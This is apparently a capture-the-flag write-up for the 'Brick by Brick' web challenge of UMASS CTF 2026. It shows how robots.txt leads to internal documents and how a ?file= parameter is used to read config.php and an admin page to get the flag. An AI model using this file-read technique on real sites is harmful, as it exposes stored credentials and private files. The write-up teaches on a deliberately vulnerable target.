# UMASS CTF 2026


## Web Challenges


### Brick by Brick

- Link: http://brick-by-brick.web.ctf.umasscybersec.org/

#### Solution

So I checked around the page to find nothing of consequence. The **robots.txt** file contained these entries:

```
User-agent: *
Disallow: /internal-docs/assembly-guide.txt
Disallow: /internal-docs/it-onboarding.txt
Disallow: /internal-docs/q3-report.txt

# NOTE: Maintenance in progress. 
# Unauthorized crawling of /internal-docs/ is prohibited.
```

So `/internal-docs/it-onboarding.txt` mentioned the following:

```
================================================================
  BRICKWORKS CO. â€” IT ONBOARDING GUIDE
  Document ID: IT-OB-2024-003
  Classification: INTERNAL USE ONLY
================================================================

Welcome to the BrickWorks IT team! This document covers system
access and tooling for new employees.

----------------------------------------------------------------
SECTION 1 - DOCUMENT PORTAL
----------------------------------------------------------------

The internal document portal lives at our main intranet address.
Staff can access any file using the ?file= parameter:

----------------------------------------------------------------
SECTION 2 - ADMIN DASHBOARD
----------------------------------------------------------------

Credentials are stored in the application config file
for reference by the IT team. See config.php in the web root.

----------------------------------------------------------------
SECTION 3 - CONTACTS
----------------------------------------------------------------

IT Helpdesk:   helpdesk@brickworks.internal
Sysadmin Lead: ops@brickworks.internal

================================================================
END OF DOCUMENT
================================================================
```

So I'll read config.php first like this: `http://brick-by-brick.web.ctf.umasscybersec.org/?file=config.php`
Now we see that the dashboard is at /dashboard-admin.php, so I'll just read the file and get the flag like this: `http://brick-by-brick.web.ctf.umasscybersec.org/?file=dashboard-admin.php`
